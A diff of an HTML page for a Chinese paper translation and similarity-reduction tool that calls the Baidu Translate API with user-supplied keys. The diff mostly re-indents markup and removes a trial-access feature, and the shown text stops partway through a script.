@@ -1,93 +1,93 @@
 <!doctype html>
 <html lang="en">
 
-<head>
-	<meta charset="utf-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-	<meta name="description" content="">
-	<meta name="author" content="">
-	<title>论文翻译降重助手</title> <!-- Favicon-->
-	<link rel="icon" type="image/x-icon" href="assets/favicon.ico"> <!-- Bootstrap icons -->
-	<link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css" rel="stylesheet"
-		type="text/css"> <!-- Core theme CSS (includes Bootstrap)-->
-	<link href="css/styles.css" rel="stylesheet">
-	<script async src="./js/busuanzi.pure.mini.js">
-	</script>
-	<script>
-		var _hmt = _hmt || [];
-		(function () {
-			var hm = document.createElement("script");
-			hm.src = "https://hm.baidu.com/hm.js?969726398af7e833bb6e27106709692b";
-			var s = document.getElementsByTagName("script")[0];
-			s.parentNode.insertBefore(hm, s);
-		})();
-	</script>
-</head>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+		<meta name="description" content="">
+		<meta name="author" content="">
+		<title>论文翻译降重助手</title> <!-- Favicon-->
+		<link rel="icon" type="image/x-icon" href="assets/favicon.ico"> <!-- Bootstrap icons -->
+		<link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css" rel="stylesheet"
+			type="text/css"> <!-- Core theme CSS (includes Bootstrap)-->
+		<link href="css/styles.css" rel="stylesheet">
+		<script async src="./js/busuanzi.pure.mini.js">
+		</script>
+		<script>
+			var _hmt = _hmt || [];
+			(function() {
+				var hm = document.createElement("script");
+				hm.src = "https://hm.baidu.com/hm.js?969726398af7e833bb6e27106709692b";
+				var s = document.getElementsByTagName("script")[0];
+				s.parentNode.insertBefore(hm, s);
+			})();
+		</script>
+	</head>
 
-<body>
-	<nav class="navbar navbar-light bg-light static-top">
-		<div class="container"> <a class="navbar-brand" href="#signup">论文翻译降重助手</a>
-			<!-- <a class="btn btn-primary"
-					href="https://docs.qq.com/sheet/DWXFSamxhSENYWGlZ" id="firstUse">公告栏</a> -->
-			<button class="btn btn-dark btn-sm relax" id="btn_show">免申请百度翻译API试用3分钟</button>
-		</div>
-	</nav>
-	<header class="masthead">
-		<div class="container position-relative">
-			<div class="row justify-content-center">
-				<div class="col-xl-6">
-					<div class="text-center text-white">
-						<h1 class="mb-5" id="start">论文翻译降重助手</h1>
-						<div class="row">
-							<div class="col ">
-								<input class="input-lg form-control	 form-control-lg originData" type="text"
-									placeholder="请在这里输入要翻译的文本" value="">
+	<body>
+		<nav class="navbar navbar-light bg-light static-top">
+			<div class="container"> <a class="navbar-brand" href="#signup">论文翻译降重助手</a>
+				<a class="btn btn-primary"
+					href="https://docs.qq.com/sheet/DWXFSamxhSENYWGlZ" id="firstUse">公告栏</a>
+			</div>
+		</nav>
+		<header class="masthead">
+			<div class="container position-relative">
+				<div class="row justify-content-center">
+					<div class="col-xl-6">
+						<div class="text-center text-white">
+							<h1 class="mb-5" id="start">论文翻译降重助手</h1>
+							<div class="row">
+								<div class="col ">
+									<input class="input-lg form-control	 form-control-lg originData" type="text"
+										placeholder="请在这里输入要翻译的文本" value="">
+								</div>
 							</div>
-						</div>
-						<div class="col-auto">
-							<button style="margin: 15px;" class="btn btn-dark btn-md translateAndCompareBtn"
-								type="button">翻译并对比</button>
-							<button style="margin: 15px;" class="btn btn-danger btn-md clear" type="button">清空</button>
-							<button style="margin: 15px;" class="btn btn-primary btn-md translateBtn"
-								type="button">翻译</button>
-							<button style="margin: 15px;" class="btn btn-primary btn-md compare"
-								type="button">对比</button>
+							<div class="col-auto">
+								<button style="margin: 15px;" class="btn btn-dark btn-md translateAndCompareBtn"
+									type="button">翻译并对比</button>
+								<button style="margin: 15px;" class="btn btn-danger btn-md clear"
+									type="button">清空</button>
+								<button style="margin: 15px;" class="btn btn-primary btn-md translateBtn"
+									type="button">翻译</button>
+								<button style="margin: 15px;" class="btn btn-primary btn-md compare"
+									type="button">对比</button>
+							</div>
 						</div>
 					</div>
 				</div>
 			</div>
-		</div>
-	</header>
-	<!--遮罩层-->
-	<div class="modal">1</div>
+		</header>
+		<!--遮罩层-->
+		<div class="modal">1</div>
 
-	<!--信息层-->
-	<div class="info">
-		<div class="rscodeDiv">
-			<img class="wxgzh" src="./assets/img/扫码_搜索联合传播样式-标准色版.png">
-			<input type="text" class="form-control-sm" id="rscode" placeholder="请在此输入密钥" name="rscode">
-			<input type="button" id="okBtn" class="btn-light btn-sm" value="提交" />
-			<input type="button" value="取消" id="btn_cancel" class="btn-light btn-sm" />
-		</div>
-	</div>
-	<section class="showcase ">
-		<div class="container-fluid p-0 ">
-			<div class="row g-0 ">
-				<div class="col-lg-6 order-lg-1 my-auto showcase-text">
-					<h2>翻译结果1
-						<a class="btn btn-default btn-sm clipboard clipboard" href="javascript:"
-							data-clipboard-target="#newData">复制</a>
-						<span class="btn btn-default btn-sm restart" style="display: none;">重试</span>
-					</h2>
-					<p class="lead mb-0 form-control newData " id="newData"></p>
-					<h4 style="margin-top: 9px;"> 对比结果1
-						<a class="btn btn-default btn-sm clipboard clipboard" href="javascript:"
-							data-clipboard-target="#compareData">复制</a>
-					</h4>
-					<p class="compareRes mb-0 form-control compareData " id="compareData"></p>
-				</div>
+		<!--信息层-->
+		<div class="info">
+			<div class="rscodeDiv">
+				<img class="wxgzh" src="./assets/img/扫码_搜索联合传播样式-标准色版.png">
+				<input type="text" class="form-control-sm" id="rscode" placeholder="请在此输入密钥" name="rscode">
+				<input type="button" id="okBtn" class="btn-light btn-sm" value="提交" />
+				<input type="button" value="取消" id="btn_cancel" class="btn-light btn-sm" />
 			</div>
-			<!-- <div class="row g-0">
+		</div>
+		<section class="showcase ">
+			<div class="container-fluid p-0 ">
+				<div class="row g-0 ">
+					<div class="col-lg-6 order-lg-1 my-auto showcase-text">
+						<h2>翻译结果1
+							<a class="btn btn-default btn-sm clipboard clipboard" href="javascript:"
+								data-clipboard-target="#newData">复制</a>
+							<span class="btn btn-default btn-sm restart" style="display: none;">重试</span>
+						</h2>
+						<p class="lead mb-0 form-control newData " id="newData"></p>
+						<h4 style="margin-top: 9px;"> 对比结果1
+							<a class="btn btn-default btn-sm clipboard clipboard" href="javascript:"
+								data-clipboard-target="#compareData">复制</a>
+						</h4>
+						<p class="compareRes mb-0 form-control compareData " id="compareData"></p>
+					</div>
+				</div>
+				<!-- <div class="row g-0">
 					<div class="col-lg-6 my-auto showcase-text">
 						<h2>翻译结果2
 							<a class="btn btn-default btn-sm clipboard clipboard" href="javascript:"
@@ -102,1120 +102,1121 @@
 						<p class="compareRes mb-0 form-control compareData1 " id="compareData1"></p>
 					</div>
 				</div> -->
-			<div class="row g-0">
-				<div class="col-lg-6 order-lg-1 my-auto showcase-text">
-					<h2>翻译结果2
-						<a class="btn btn-default btn-sm clipboard clipboard" href="javascript:"
-							data-clipboard-target="#newData2">复制</a>
-						<span class="btn btn-default btn-sm restart2" style="display: none;">重试</span>
-					</h2>
-					<p class="lead mb-0 form-control newData2" id="newData2"></p>
-					<h4 style="margin-top: 9px;"> 对比结果2
-						<a class="btn btn-default btn-sm clipboard clipboard" href="javascript:"
-							data-clipboard-target="#compareData2">复制</a>
-					</h4>
-					<p class="compareRes mb-0 form-control compareData2 " id="compareData2"></p>
+				<div class="row g-0">
+					<div class="col-lg-6 order-lg-1 my-auto showcase-text">
+						<h2>翻译结果2
+							<a class="btn btn-default btn-sm clipboard clipboard" href="javascript:"
+								data-clipboard-target="#newData2">复制</a>
+							<span class="btn btn-default btn-sm restart2" style="display: none;">重试</span>
+						</h2>
+						<p class="lead mb-0 form-control newData2" id="newData2"></p>
+						<h4 style="margin-top: 9px;"> 对比结果2
+							<a class="btn btn-default btn-sm clipboard clipboard" href="javascript:"
+								data-clipboard-target="#compareData2">复制</a>
+						</h4>
+						<p class="compareRes mb-0 form-control compareData2 " id="compareData2"></p>
+					</div>
 				</div>
-			</div>
-			<div class="row g-0">
-				<div class="col-lg-6 order-lg-1 my-auto showcase-text">
-					<h2>翻译结果3
-						<a class="btn btn-default btn-sm clipboard clipboard" href="javascript:"
-							data-clipboard-target="#newData3">复制</a>
-						<span class="btn btn-default btn-sm restart3" style="display: none;">重试</span>
-					</h2>
-					<p class="lead mb-0 form-control newData3" id="newData3"></p>
-					<h4 style="margin-top: 9px;"> 对比结果3
-						<a class="btn btn-default btn-sm clipboard clipboard" href="javascript:"
-							data-clipboard-target="#compareData3">复制</a>
-					</h4>
-					<p class="compareRes mb-0 form-control compareData3 " id="compareData3"></p>
+				<div class="row g-0">
+					<div class="col-lg-6 order-lg-1 my-auto showcase-text">
+						<h2>翻译结果3
+							<a class="btn btn-default btn-sm clipboard clipboard" href="javascript:"
+								data-clipboard-target="#newData3">复制</a>
+							<span class="btn btn-default btn-sm restart3" style="display: none;">重试</span>
+						</h2>
+						<p class="lead mb-0 form-control newData3" id="newData3"></p>
+						<h4 style="margin-top: 9px;"> 对比结果3
+							<a class="btn btn-default btn-sm clipboard clipboard" href="javascript:"
+								data-clipboard-target="#compareData3">复制</a>
+						</h4>
+						<p class="compareRes mb-0 form-control compareData3 " id="compareData3"></p>
+					</div>
 				</div>
-			</div>
-			<div class="row g-0">
-				<div class="col-lg-6 order-lg-1 my-auto showcase-text">
-					<h2>翻译结果4
-						<a class="btn btn-default btn-sm clipboard clipboard" href="javascript:"
-							data-clipboard-target="#newData4">复制</a>
-						<span class="btn btn-default btn-sm restart4" style="display: none;">重试</span>
-					</h2>
-					<p class="lead mb-0 form-control newData4" id="newData4"></p>
-					<h4 style="margin-top: 9px;"> 对比结果4
-						<a class="btn btn-default btn-sm clipboard clipboard" href="javascript:"
-							data-clipboard-target="#compareData4">复制</a>
-					</h4>
-					<p class="compareRes mb-0 form-control compareData4 " id="compareData4"></p>
+				<div class="row g-0">
+					<div class="col-lg-6 order-lg-1 my-auto showcase-text">
+						<h2>翻译结果4
+							<a class="btn btn-default btn-sm clipboard clipboard" href="javascript:"
+								data-clipboard-target="#newData4">复制</a>
+							<span class="btn btn-default btn-sm restart4" style="display: none;">重试</span>
+						</h2>
+						<p class="lead mb-0 form-control newData4" id="newData4"></p>
+						<h4 style="margin-top: 9px;"> 对比结果4
+							<a class="btn btn-default btn-sm clipboard clipboard" href="javascript:"
+								data-clipboard-target="#compareData4">复制</a>
+						</h4>
+						<p class="compareRes mb-0 form-control compareData4 " id="compareData4"></p>
+					</div>
 				</div>
-			</div>
-			<div class="row g-0">
-				<div class="col-lg-6 order-lg-1 my-auto showcase-text">
-					<h2>翻译结果5
-						<a class="btn btn-default btn-sm clipboard clipboard" href="javascript:"
-							data-clipboard-target="#newData5">复制</a>
-						<span class="btn btn-default btn-sm restart5" style="display: none;">重试</span>
-					</h2>
-					<p class="lead mb-0 form-control newData5" id="newData5"></p>
-					<h4 style="margin-top: 9px;"> 对比结果5
-						<a class="btn btn-default btn-sm clipboard clipboard" href="javascript:"
-							data-clipboard-target="#compareData5">复制</a>
-					</h4>
-					<p class="compareRes mb-0 form-control compareData5 " id="compareData5"></p>
+				<div class="row g-0">
+					<div class="col-lg-6 order-lg-1 my-auto showcase-text">
+						<h2>翻译结果5
+							<a class="btn btn-default btn-sm clipboard clipboard" href="javascript:"
+								data-clipboard-target="#newData5">复制</a>
+							<span class="btn btn-default btn-sm restart5" style="display: none;">重试</span>
+						</h2>
+						<p class="lead mb-0 form-control newData5" id="newData5"></p>
+						<h4 style="margin-top: 9px;"> 对比结果5
+							<a class="btn btn-default btn-sm clipboard clipboard" href="javascript:"
+								data-clipboard-target="#compareData5">复制</a>
+						</h4>
+						<p class="compareRes mb-0 form-control compareData5 " id="compareData5"></p>
+					</div>
 				</div>
-			</div>
-			<div class="row g-0">
-				<div class="col-lg-6 order-lg-1 my-auto showcase-text">
-					<h2>翻译结果6
-						<a class="btn btn-default btn-sm clipboard clipboard" href="javascript:"
-							data-clipboard-target="#newData6">复制</a>
-						<span class="btn btn-default btn-sm restart6" style="display: none;">重试</span>
-					</h2>
-					<p class="lead mb-0 form-control newData6" id="newData6"></p>
-					<h4 style="margin-top: 9px;"> 对比结果6
-						<a class="btn btn-default btn-sm clipboard clipboard" href="javascript:"
-							data-clipboard-target="#compareData6">复制</a>
-					</h4>
-					<p class="compareRes mb-0 form-control compareData6 " id="compareData6"></p>
+				<div class="row g-0">
+					<div class="col-lg-6 order-lg-1 my-auto showcase-text">
+						<h2>翻译结果6
+							<a class="btn btn-default btn-sm clipboard clipboard" href="javascript:"
+								data-clipboard-target="#newData6">复制</a>
+							<span class="btn btn-default btn-sm restart6" style="display: none;">重试</span>
+						</h2>
+						<p class="lead mb-0 form-control newData6" id="newData6"></p>
+						<h4 style="margin-top: 9px;"> 对比结果6
+							<a class="btn btn-default btn-sm clipboard clipboard" href="javascript:"
+								data-clipboard-target="#compareData6">复制</a>
+						</h4>
+						<p class="compareRes mb-0 form-control compareData6 " id="compareData6"></p>
+					</div>
 				</div>
-			</div>
-			<div class="row g-0">
-				<div class="col-lg-6 order-lg-1 my-auto showcase-text">
-					<h2>翻译结果7
-						<a class="btn btn-default btn-sm clipboard clipboard" href="javascript:"
-							data-clipboard-target="#newData7">复制</a>
-						<span class="btn btn-default btn-sm restart7" style="display: none;">重试</span>
-					</h2>
-					<p class="lead mb-0 form-control newData7" id="newData7"></p>
-					<h4 style="margin-top: 9px;"> 对比结果7
-						<a class="btn btn-default btn-sm clipboard clipboard" href="javascript:"
-							data-clipboard-target="#compareData7">复制</a>
-					</h4>
-					<p class="compareRes mb-0 form-control compareData7 " id="compareData7"></p>
+				<div class="row g-0">
+					<div class="col-lg-6 order-lg-1 my-auto showcase-text">
+						<h2>翻译结果7
+							<a class="btn btn-default btn-sm clipboard clipboard" href="javascript:"
+								data-clipboard-target="#newData7">复制</a>
+							<span class="btn btn-default btn-sm restart7" style="display: none;">重试</span>
+						</h2>
+						<p class="lead mb-0 form-control newData7" id="newData7"></p>
+						<h4 style="margin-top: 9px;"> 对比结果7
+							<a class="btn btn-default btn-sm clipboard clipboard" href="javascript:"
+								data-clipboard-target="#compareData7">复制</a>
+						</h4>
+						<p class="compareRes mb-0 form-control compareData7 " id="compareData7"></p>
+					</div>
 				</div>
-			</div>
-	</section> <!-- Call to Action-->
-	<section class="call-to-action text-white text-center" id="signup">
-		<div class="container position-relative">
-			<div class="row justify-content-center">
-				<div class="col-xl-6">
-					<h2 class="mb-4" id="account">请在这配置账号</h2>
-					<form class="form-subscribe" id="contactFormFooter">
-						<div class="row">
-							<div class="col">
-								<input class="form-control form-control-lg" id="yourAppid" type="text"
-									placeholder="appid" title="在这输入你的百度翻译API的appid">
+		</section> <!-- Call to Action-->
+		<section class="call-to-action text-white text-center" id="signup">
+			<div class="container position-relative">
+				<div class="row justify-content-center">
+					<div class="col-xl-6">
+						<h2 class="mb-4" id="account">请在这配置账号</h2>
+						<form class="form-subscribe" id="contactFormFooter">
+							<div class="row">
+								<div class="col">
+									<input class="form-control form-control-lg" id="yourAppid" type="text"
+										placeholder="appid" title="在这输入你的百度翻译API的appid">
+								</div>
+								<div class="col">
+									<input class="form-control form-control-lg" id="yourKey" type="password"
+										placeholder="key" title="在这输入你的百度翻译API的key">
+								</div>
 							</div>
-							<div class="col">
-								<input class="form-control form-control-lg" id="yourKey" type="password" placeholder="key"
-									title="在这输入你的百度翻译API的key">
+							<div class="col-auto"> <button style="margin:27px" class="btn btn-primary btn-md "
+									id="saveBtn" type="button">保存</button> <button style="margin:27px"
+									class="btn btn-danger btn-md " id="deleteBtn" type="button">删除</button> <a
+									style="margin:27px" class="btn btn-warning btn-md helpTip" id="helpTip"
+									title="如果遇到不懂可以查阅使用说明"
+									href="https://freysu.github.io/2022/02/28/论文翻译降重助手使用说明文档/">帮助</a>
 							</div>
-						</div>
-						<div class="col-auto"> <button style="margin:27px" class="btn btn-primary btn-md " id="saveBtn"
-								type="button">保存</button> <button style="margin:27px" class="btn btn-danger btn-md "
-								id="deleteBtn" type="button">删除</button> <a style="margin:27px"
-								class="btn btn-warning btn-md helpTip" id="helpTip" title="如果遇到不懂可以查阅使用说明"
-								href="https://freysu.github.io/2022/02/28/论文翻译降重助手使用说明文档/">帮助</a>
-						</div>
-					</form>
+						</form>
+					</div>
 				</div>
 			</div>
-		</div>
-	</section> <!-- Footer-->
-	<footer class="footer bg-light">
-		<div class="container">
-			<div class="row">
-				<div class="col-lg-6 h-100 text-center text-lg-start my-auto">
-					<ul class="list-inline mb-2">
-						<li class="list-inline-item">
-							<a href="https://www.coolapk.com/u/3128087">酷安主页</a>
-						</li>
-						<li class="list-inline-item">
-							<a href="https://freysu.github.io/">博客主页</a>
-						</li>
-						<li class="list-inline-item">
-							<a href="https://github.com/freysu">Github主页</a>
-						</li>
-						<li class="list-inline-item">
-							<a href="https://gitee.com/freysu">Gitee主页</a>
-						</li>
-						<li class="list-inline-item">
-							<a href="https://github.com/freysu/MyTranslator">Github仓库地址</a>
-						</li>
-						<li class="list-inline-item">
-							<a href="https://docs.qq.com/sheet/DWXFSamxhSENYWGlZ">公告栏</a>
-						</li>
-						<li class="list-inline-item">
-							<a
-								href="https://qm.qq.com/cgi-bin/qm/qr?k=hlJz6QmW7t698xfszVwmFzfkRBepMqlU&authKey=P3EUwihrtIYUgaS/vmV5AuHFBNueeB3zc7Od6OzJaJBbLhE9yFJtpEznxwK8whVQ&noverify=0"><b>QQ交流群</b></a>
-						</li>
-					</ul>
-					<p class="text-muted small mb-4 mb-lg-0">© Frey 2021. All Rights Reserved.</p>
-				</div>
-				<div class="col-lg-6 h-100 text-center text-lg-end my-auto">
-					<span id="busuanzi_container_page_pv">
-						我的第<span id="busuanzi_value_site_uv"></span>个小伙伴<br />
-						本站总访问量<span id="busuanzi_value_site_pv"></span>次<br />
-						本页总阅读量<span id="busuanzi_value_page_pv"></span>次
-					</span>
-					<ul class="list-inline mb-0">
-						<li class="list-inline-item me-4">
-							<a href="https://gitee.com/freysu" onclick="showToast('即将跳转到作者的Gitee主页...',1500)">
-								<img class="contact" src="https://gitee.com/static/images/logo-black.svg?t=158106664"
-									alt="" title="Gitee" style="width: 2rem;margin-top:-0.625rem ;">
-							</a>
-						</li>
-						<li class="list-inline-item me-4">
-							<a href="https://freysu.github.io/" onclick="showToast('即将跳转到作者的博客...',1500)"><i
-									class="bi-github fs-3"></i></a>
-						</li>
-						<li class="list-inline-item me-4">
-							<a href="https://github.com/freysu" onclick="showToast('即将跳转到作者的Github主页...',1500)"><i
-									class="bi-github fs-3"></i></a>
-						</li>
-						<li class="list-inline-item me-4">
-							<a href="https://www.coolapk.com/u/3128087">
-								<img class="contact" src="./assets/img/coolapk.png" alt="" title="联系我"
-									style="width: 1.66875rem;margin-top:-0.625rem ;">
-							</a>
-						</li>
-					</ul>
+		</section>
+		<!-- Footer-->
+		<footer class="footer bg-light">
+			<div class="container">
+				<div class="row">
+					<div class="col-lg-6 h-100 text-center text-lg-start my-auto">
+						<ul class="list-inline mb-2">
+							<li class="list-inline-item">
+								<a href="https://www.coolapk.com/u/3128087">酷安主页</a>
+							</li>
+							<li class="list-inline-item">
+								<a href="https://freysu.github.io/">博客主页</a>
+							</li>
+							<li class="list-inline-item">
+								<a href="https://github.com/freysu">Github主页</a>
+							</li>
+							<li class="list-inline-item">
+								<a href="https://gitee.com/freysu">Gitee主页</a>
+							</li>
+							<li class="list-inline-item">
+								<a href="https://github.com/freysu/MyTranslator">Github仓库地址</a>
+							</li>
+							<li class="list-inline-item">
+								<a href="https://docs.qq.com/sheet/DWXFSamxhSENYWGlZ">公告栏</a>
+							</li>
+							<li class="list-inline-item">
+								<a
+									href="https://qm.qq.com/cgi-bin/qm/qr?k=hlJz6QmW7t698xfszVwmFzfkRBepMqlU&authKey=P3EUwihrtIYUgaS/vmV5AuHFBNueeB3zc7Od6OzJaJBbLhE9yFJtpEznxwK8whVQ&noverify=0"><b>QQ交流群</b></a>
+							</li>
+						</ul>
+						<p class="text-muted small mb-4 mb-lg-0">© Frey 2021. All Rights Reserved.</p>
+					</div>
+					<div class="col-lg-6 h-100 text-center text-lg-end my-auto">
+						<span id="busuanzi_container_page_pv">
+							我的第<span id="busuanzi_value_site_uv"></span>个小伙伴<br />
+							本站总访问量<span id="busuanzi_value_site_pv"></span>次<br />
+							本页总阅读量<span id="busuanzi_value_page_pv"></span>次
+						</span>
+						<ul class="list-inline mb-0">
+							<li class="list-inline-item me-4">
+								<a href="https://gitee.com/freysu" onclick="showToast('即将跳转到作者的Gitee主页...',1500)">
+									<img class="contact"
+										src="https://gitee.com/static/images/logo-black.svg?t=158106664" alt=""
+										title="Gitee" style="width: 2rem;margin-top:-0.625rem ;">
+								</a>
+							</li>
+							<li class="list-inline-item me-4">
+								<a href="https://freysu.github.io/" onclick="showToast('即将跳转到作者的博客...',1500)"><i
+										class="bi-github fs-3"></i></a>
+							</li>
+							<li class="list-inline-item me-4">
+								<a href="https://github.com/freysu" onclick="showToast('即将跳转到作者的Github主页...',1500)"><i
+										class="bi-github fs-3"></i></a>
+							</li>
+							<li class="list-inline-item me-4">
+								<a href="https://www.coolapk.com/u/3128087">
+									<img class="contact" src="./assets/img/coolapk.png" alt="" title="联系我"
+										style="width: 1.66875rem;margin-top:-0.625rem ;">
+								</a>
+							</li>
+						</ul>
+					</div>
 				</div>
 			</div>
+		</footer>
+		<div class="fixed_btn">
+			<a>
+				<img class="btu" src="./assets/img/返回顶部.png" alt="" title="返回顶部" onclick="window.scrollTo(0, 0);">
+			</a>
+			<a href="https://freysu.github.io/2022/02/28/论文翻译降重助手使用说明文档/">
+				<img class="contact img-rounded" src="./assets/img/联系人.png" alt="" title="使用帮助">
+			</a>
+			<a href="#start">
+				<img class="bti img-rounded" src="./assets/img/返回输入框.png" alt="" title="返回到翻译内容输入框">
+			</a>
+			<a href="#account">
+				<img class="btd" src="./assets/img/返回底部.png" alt="" title="跳转到账号配置区域">
+			</a>
 		</div>
-	</footer>
-	<div class="fixed_btn">
-		<a>
-			<img class="btu" src="./assets/img/返回顶部.png" alt="" title="返回顶部" onclick="window.scrollTo(0, 0);">
-		</a>
-		<a href="https://freysu.github.io/2022/02/28/论文翻译降重助手使用说明文档/">
-			<img class="contact img-rounded" src="./assets/img/联系人.png" alt="" title="使用帮助">
-		</a>
-		<a href="#start">
-			<img class="bti img-rounded" src="./assets/img/返回输入框.png" alt="" title="返回到翻译内容输入框">
-		</a>
-		<a href="#account">
-			<img class="btd" src="./assets/img/返回底部.png" alt="" title="跳转到账号配置区域">
-		</a>
-	</div>
-	<script src="./js/jquery.min.js"></script>
-	<script src="./js/bootstrap.min.js"></script> <!-- Bootstrap core JS-->
-	<script src="./js/bootstrap.bundle.min.js"></script>
-	<!-- Core theme JS-->
-	<script src="./js/clipboard.min.js"></script>
-	<script src="./js/md5.js"></script>
-	<script type="text/javascript">
-		var clipboard = new ClipboardJS('.clipboard');
-	</script>
-	<!--打赏-->
-	<link type="text/css" rel="stylesheet" href="./css/myRewards.css">
-	<script>
-		window.tctipConfig = {
-			//最上面的文字
-			headText: "公告 & 打赏",
-			//侧边栏文本
-			siderText: "公告 & 打赏",
-			//侧边栏文本高度调整
-			siderTextTop: "-72px",
-			//侧边栏背景颜色
-			siderBgcolor: "#323d45",
-			//整个侧边栏的高度设置
-			siderTop: "118px",
-			//底部文字
-			buttomText: "使用帮助",
-			//底部文字链接
-			buttomLink: "https://freysu.github.io/2022/02/28/论文翻译降重助手使用说明文档/",
-			//显示列表
-			list: {
-				notice: {
-					name: "公告",
-					className: "myR-on",
-					icon: "./assets/img/tip.png",
-					text: `抱歉！麻烦之前填写过appid和key的小伙伴们<b>重新填写</b>！</br> &emsp;这个网站好用吗？好用的话，请给作者一点鼓励吧~维护不易，如果能请作者喝杯冰阔落，那最好不过啦~ 非常感谢！</br> `,
-				},
-				qqgroup: {
-					name: "QQ群",
-					desc: "欢迎进群反馈交流！",
-					icon: "./assets/img/tree-round-QQ群.png",
-					qrimg: "./assets/img/QQ群二维码.png"
-				},
-				alipay: {
-					name: "支付宝",
-					desc: "用支付宝给“FreySu”打赏",
-					icon: "./assets/img/支付宝.png",
-					qrimg: "./assets/img/支付宝收款码.png"
-				},
-				weixin: {
-					name: "微信",
-					desc: "用微信给“FreySu”打赏",
-					icon: "./assets/img/微信.png",
-					qrimg: "./assets/img/微信收款码.png"
-				},
-				qq: {
-					name: "QQ",
-					desc: "用QQ给“FreySu”打赏",
-					icon: "./assets/img/qq.png",
-					qrimg: "./assets/img/QQ收款码.png"
+		<script src="./js/jquery.min.js"></script>
+		<script src="./js/bootstrap.min.js"></script> <!-- Bootstrap core JS-->
+		<script src="./js/bootstrap.bundle.min.js"></script>
+		<!-- Core theme JS-->
+		<script src="./js/clipboard.min.js"></script>
+		<script src="./js/md5.js"></script>
+		<script type="text/javascript">
+			var clipboard = new ClipboardJS('.clipboard');
+		</script>
+		<!--打赏-->
+		<link type="text/css" rel="stylesheet" href="./css/myRewards.css">
+		<script>
+			window.tctipConfig = {
+				//最上面的文字
+				headText: "公告 & 打赏",
+				//侧边栏文本
+				siderText: "公告 & 打赏",
+				//侧边栏文本高度调整
+				siderTextTop: "-72px",
+				//侧边栏背景颜色
+				siderBgcolor: "#323d45",
+				//整个侧边栏的高度设置
+				siderTop: "118px",
+				//底部文字
+				buttomText: "使用帮助",
+				//底部文字链接
+				buttomLink: "https://freysu.github.io/2022/02/28/论文翻译降重助手使用说明文档/",
+				//显示列表
+				list: {
+					notice: {
+						name: "公告",
+						className: "myR-on",
+						icon: "./assets/img/tip.png",
+						text: `抱歉！麻烦之前填写过appid和key的小伙伴们<b>重新填写</b>！</br> &emsp;这个网站好用吗？好用的话，请给作者一点鼓励吧~维护不易，如果能请作者喝杯冰阔落，那最好不过啦~ 非常感谢！</br> `,
+					},
+					qqgroup: {
+						name: "QQ群",
+						desc: "欢迎进群反馈交流！",
+						icon: "./assets/img/tree-round-QQ群.png",
+						qrimg: "./assets/img/QQ群二维码.png"
+					},
+					alipay: {
+						name: "支付宝",
+						desc: "感谢你的支持，我会继续努力！",
+						icon: "./assets/img/支付宝.png",
+						qrimg: "./assets/img/支付宝收款码.png"
+					},
+					weixin: {
+						name: "微信",
+						desc: "感谢你的支持，我会继续努力！",
+						icon: "./assets/img/微信.png",
+						qrimg: "./assets/img/微信收款码.png"
+					},
+					qq: {
+						name: "QQ",
+						desc: "感谢你的支持，我会继续努力！",
+						icon: "./assets/img/qq.png",
+						qrimg: "./assets/img/QQ收款码.png"
+					}
 				}
-			}
-		};
-	</script>
-	<script src="./js/tctip.min.js"></script>
-	<script>
-		Storage.prototype.setExpire = (key, value, expire) => {
-			let obj = {
-			data: value,
-			time: Date.now(),
-			expire: expire
 			};
-			//localStorage 设置的值不能为对象,转为json字符串
-			localStorage.setItem(key, JSON.stringify(obj));
-		}
-		
-		Storage.prototype.getExpire = key => {
-		    let val = localStorage.getItem(key);
-		    if (!val) {
-		        return val;
-		    }
-		    val = JSON.parse(val);
-		    if (Date.now() - val.time > val.expire) {
-		        localStorage.removeItem(key);
-		        return null;
-		    }
-		    return val.data;
-		}
-		
-		let to = $(".originData");
-		let from = $(".newData");
-		let from1 = $(".newData1");
-		let from2 = $(".newData2");
-		let from3 = $(".newData3");
-		let from4 = $(".newData4");
-		let from5 = $(".newData5");
-		let from6 = $(".newData6");
-		let from7 = $(".newData7");
-		let compare = $(".compareData");
-		let compare1 = $(".compareData1");
-		let compare2 = $(".compareData2");
-		let compare3 = $(".compareData3");
-		let compare4 = $(".compareData4");
-		let compare5 = $(".compareData5");
-		let compare6 = $(".compareData6");
-		let compare7 = $(".compareData7");
-		var appid = String(localStorage.getExpire("appid1")).replace (/^\"|\"$/g,'');
-		var key = String(localStorage.getExpire("key1")).replace (/^\"|\"$/g,'');
-		const url = 'https://api.fanyi.baidu.com/api/trans/vip/translate';
-		let timer = null;
+		</script>
+		<script src="./js/tctip.min.js"></script>
+		<script>
 
-		$("#yourAppid").val(appid);
-		$("#yourKey").val(key);
+			let to = $(".originData");
+			let from = $(".newData");
+			let from1 = $(".newData1");
+			let from2 = $(".newData2");
+			let from3 = $(".newData3");
+			let from4 = $(".newData4");
+			let from5 = $(".newData5");
+			let from6 = $(".newData6");
+			let from7 = $(".newData7");
+			let compare = $(".compareData");
+			let compare1 = $(".compareData1");
+			let compare2 = $(".compareData2");
+			let compare3 = $(".compareData3");
+			let compare4 = $(".compareData4");
+			let compare5 = $(".compareData5");
+			let compare6 = $(".compareData6");
+			let compare7 = $(".compareData7");
+			var appid = localStorage.getItem("appid1");
+			var key = localStorage.getItem("key1");
+			const url = 'https://api.fanyi.baidu.com/api/trans/vip/translate';
+			let timer = null;
+			
 
-		if (!localStorage.getExpire("appid1") || !localStorage.getExpire("key1")) {
-				showToast("欢迎新来的小伙伴来访！你可以点击右上角的【免申请API试用一次】，等体验完再去页面底下配置账号吧...", 4500)
-				location.href = "#btn_show";
-		} else if(localStorage.getExpire("appid1") == "null" || localStorage.getExpire("key1") == "null") {
-				showToast("试用结束，请先到页面底下配置账号！", 4500)
+			$("#yourAppid").val(appid);
+			$("#yourKey").val(key);
+
+			if (!localStorage.getItem("appid1") || !localStorage.getItem("key1")) {
+				showToast("欢迎新来的小伙伴来访！请先到页面底下配置账号！", 4500);
 				location.href = "#account";
-		} else{
-			showToast('今天又是美好的一天，论文人加油啊！最近优化了网站，之前填写的appid和key都已失效，需要重新填写，抱歉！', 3500)
-		}
-		
-		$("#saveBtn").click(() => {
-			const fn = () => {
-				let _appid = $("#yourAppid").val();
-				let _key = $("#yourKey").val()
-				if (!_appid || !_key || _appid == "null" || _key == "null") {
